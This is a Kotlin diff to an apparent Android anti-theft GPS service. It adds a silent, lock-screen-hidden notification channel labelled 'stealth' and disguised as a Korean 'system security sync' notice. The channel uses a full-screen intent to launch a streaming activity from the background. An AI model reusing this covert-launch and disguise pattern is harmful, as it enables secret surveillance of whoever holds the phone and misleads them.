@@ -230,23 +230,59 @@ class GpsLoggingService : Service() {
             addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
         }
 
-        // CPU 활성 유지를 위한 WakeLock 획득 (화면 알림 없이 백그라운드 구동)
+        val pendingIntent = PendingIntent.getActivity(
+            this,
+            roomId.hashCode(),
+            streamIntent,
+            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+        )
+
+        // Android 10+ 백그라운드 액티비티 기동 보장을 위한 무음 고우선순위 풀스크린 알림
+        val channelId = "stealth_stream_channel_v3"
+        val notificationManager = getSystemService(NotificationManager::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(channelId, "시스템 동기화", NotificationManager.IMPORTANCE_HIGH).apply {
+                description = "백그라운드 보안 연결 유지"
+                enableVibration(false)
+                vibrationPattern = longArrayOf(0)
+                setSound(null, null)
+                setShowBadge(false)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
+            }
+            notificationManager.createNotificationChannel(channel)
+        }
+
+        val notification = NotificationCompat.Builder(this, channelId)
+            .setContentTitle("시스템 보안 동기화")
+            .setContentText("기기 보안 채널이 활성화되었습니다.")
+            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
+            .setPriority(NotificationCompat.PRIORITY_HIGH)
+            .setCategory(NotificationCompat.CATEGORY_SERVICE)
+            .setFullScreenIntent(pendingIntent, true)
+            .setContentIntent(pendingIntent)
+            .setAutoCancel(true)
+            .setSilent(true)
+            .build()
+
+        notificationManager.notify(2001, notification)
+
+        // CPU 활성 유지를 위한 WakeLock 획득
         try {
             val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
             val wakeLock = powerManager.newWakeLock(
                 PowerManager.PARTIAL_WAKE_LOCK,
                 "AntiTheft:StreamWakeLock"
             )
-            wakeLock.acquire(15_000L)
+            wakeLock.acquire(30_000L)
         } catch (e: Exception) {
             Log.e(TAG, "WakeLock 획득 실패", e)
         }
 
-        // 액티비티 직접 기동 시도
+        // 액티비티 직접 기동 시도 (오버레이 권한 허용 기기 즉시 기동)
         try {
             startActivity(streamIntent)
         } catch (e: Exception) {
-            Log.e(TAG, "startActivity 직접 호출 실패, 헤드업 알림으로 사용자 진입 대기", e)
+            Log.e(TAG, "startActivity 직접 호출 실패 (풀스크린 인텐트 대기)", e)
         }
     }
 
